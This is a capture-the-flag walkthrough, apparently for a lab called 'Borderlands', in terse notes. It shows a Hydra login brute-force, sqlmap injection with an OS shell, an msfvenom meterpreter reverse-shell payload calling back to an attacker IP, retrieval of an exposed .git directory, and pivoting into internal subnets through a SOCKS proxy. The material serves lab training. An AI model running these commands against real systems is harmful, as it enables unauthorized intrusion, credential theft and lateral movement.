# Task 4: Borderlands [Networking] [Insane]

## Question 2: What is the API key that fits the following pattern: "WEB*"

Ennumeate web directories with dirb

Get post data for login form

Brute force login form with Hydra

hydra -I -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.221.98 http-post-form "/:username=^USER^&password=^PASS^:F=bad username"

billg:potato

## Question 4: What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX}

API uses SQL, use SQL map to check for injection

sqlmap --random-agent -u "http://10.10.221.98/api.php?documentid=2&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" -p documentid

Pop a shell using --os-shell

Use msfvenom to generate meterpreter for better shell

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.8.0.125 -f elf -o shell

Drop using sqlmap file stager

msfconsole

Set up handler

Run reverse shell from SQLMap shell

cat flag

## Question 1: What is the API key that fits the following pattern: "AND*"

Decompile APK using APKTool

Check source code for activies

MainActivity open Main2Activity

MainActivity2 references api.php and a string resource that is decrypted by an unimplemented function that uses another string as a key

<string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>

Doesn't look encoded

Probably a fairly basic cipher as no hints to implementation are given

We know it starts with "AND"

Cannot be caeser cipher - distance from C-A and B-N is difference

Potentially VigenÃ¨re cipher

Now we have access to the web server we can look at api.php to see how the API keys are checked

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
{
    die("Invalid API key");
}

Doesn't give us full key but gives us a very big crib, if we use until the first number(numbers can't be part of key), should reveal the key

CONTEXTCONT5U8YGG2tlQQSvYi2mNt

Context seems like a sane key

ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk

Could guess this from context ;) and just the crib of "AND" revealing "CON"

## Question 3: What is the API key that fits the following pattern: "GIT*"

Could be done through directory discovery but much easier once you have web server access.

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

Instead:
metepreter> download .git

Files will be in the working directory you opened msfconsole from

Move .git to new folder

git checkout -- .

    removed sensitive data

Looks like what we're looking for

git revert b2f776a52fe81a731c6c0fa896e7f9548aafceab

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}

Has full API key: 

b2f776a52fe81a731c6c0fa896e7f9548aafceab


## Question 5: What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}

Need more tools - limited tools on machine - no ping, dig, wget.

Need nmap for host discovery

Binaries must be self contained as there isn't much on this server and we don't have packet manager access

https://github.com/ernw/static-toolbox

https://insinuator.net/2018/02/creating-static-binaries-for-nmap-socat-and-other-tools/

https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox

Drop onto machine using meterpreter - larger file limit

We know we can reach a router of some sort from this box

shell

ip addr

Two interfaces 172.18.0.0/16 172.16.1.0/24

./nmap -sP 172.16.1.0/24 172.18.0.0/16 for host discovery


172.18.0.1 looks like the aws host
172.18.0.2 is us

172.16.1.10 is us
172.16.1.128 is hackback_router1_1.hackback_r_1_ext which sounds like what we're trying to get to

./nmap -p- 172.16.1.128

This version of nmap doesn't have scripts, so I used the nmaps socks proxy for routing and the kali's nmap for service ennumeration - ennumeration is everything

ctrl+c to close shell
ctrl+z to background session

use auxiliary/server/socks4a 

run



Add route to metasploit through session

route add 172.16.1.0 255.255.255.0 2

nano /etc/proxychains.conf

## Question 6: What flag is transmitted from flag_server to flag_client over UDP? {FLAG:UDP:XXX}

Meterpreter can act as a listener for msfconsole, this shell is unreliale and limited so lets drop a meterpeter here too for stability

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.1.10 -f elf -o shell

upload using meterpreter to web app machine

download using wget on router

set up listener to use 172.16.1.10

run handler

run reverse shell

Setup SSH

Fix SSH
